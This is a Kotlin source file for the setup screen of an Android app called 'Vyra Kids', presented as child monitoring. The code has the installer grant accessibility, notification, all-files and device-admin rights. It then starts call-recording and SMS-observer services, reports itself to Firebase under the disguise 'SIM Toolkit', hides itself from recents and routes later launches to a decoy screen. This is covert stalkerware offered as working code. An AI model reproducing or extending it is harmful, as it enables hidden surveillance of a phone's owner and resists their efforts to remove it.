package com.vyra.kids.ui

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.vyra.kids.R
import com.vyra.kids.core.PrefsManager
import com.vyra.kids.receivers.VyraDeviceAdminReceiver
import com.vyra.kids.services.CallRecordingSyncService
import com.vyra.kids.services.SmsObserverService

class SetupWizardActivity : AppCompatActivity() {

    private lateinit var prefs: PrefsManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        prefs = PrefsManager(this)
        if (prefs.isConfigured) {
            startActivity(Intent(this, DecoyDisplayActivity::class.java))
            finish()
            return
        }

        setContentView(R.layout.activity_setup_wizard)

        val etPairingCode = findViewById<EditText>(R.id.etPairingCode)
        val btnAccessibility = findViewById<Button>(R.id.btnAccessibility)
        val btnNotification = findViewById<Button>(R.id.btnNotification)
        val btnStorage = findViewById<Button>(R.id.btnStorage)
        val btnDeviceAdmin = findViewById<Button>(R.id.btnDeviceAdmin)
        val btnCompleteSetup = findViewById<Button>(R.id.btnCompleteSetup)

        // 1. Accessibility Intent
        btnAccessibility.setOnClickListener {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            Toast.makeText(this, "Enable 'Device Care Accessibility Service'", Toast.LENGTH_LONG).show()
        }

        // 2. Notification Access Intent
        btnNotification.setOnClickListener {
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
            Toast.makeText(this, "Enable 'Device Care Notification Service'", Toast.LENGTH_LONG).show()
        }

        // 3. Storage / All Files Access Intent
        btnStorage.setOnClickListener {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            } else {
                Toast.makeText(this, "Storage permission active", Toast.LENGTH_SHORT).show()
            }
        }

        // 4. Device Administrator Intent
        btnDeviceAdmin.setOnClickListener {
            val compName = ComponentName(this, VyraDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protects device against unauthorized removal and tampering.")
            }
            startActivity(intent)
        }

        // 5. Complete Setup
        btnCompleteSetup.setOnClickListener {
            val code = etPairingCode.text.toString().trim()
            if (code.isBlank()) {
                Toast.makeText(this, "Please enter a valid pairing code", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            prefs.pairingCode = code
            prefs.isConfigured = true

            // 1. Initial Device Status sync to Firebase Cloud
            com.vyra.kids.core.FirebaseSyncManager.getInstance(this).syncDeviceStatus(
                batteryLevel = 85,
                isOnline = true,
                disguise = "SIM Toolkit",
                location = "Online • Protected"
            )

            // 2. Start foreground monitoring services
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(Intent(this, CallRecordingSyncService::class.java))
                startForegroundService(Intent(this, SmsObserverService::class.java))
            } else {
                startService(Intent(this, CallRecordingSyncService::class.java))
                startService(Intent(this, SmsObserverService::class.java))
            }

            Toast.makeText(this, "Setup complete! Device protected.", Toast.LENGTH_SHORT).show()

            // 3. AUTO-VANISH: Close setup wizard, remove from recents, and exit directly to Home Screen
            val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_HOME)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            }
            startActivity(homeIntent)
            finishAffinity()
        }
    }
}
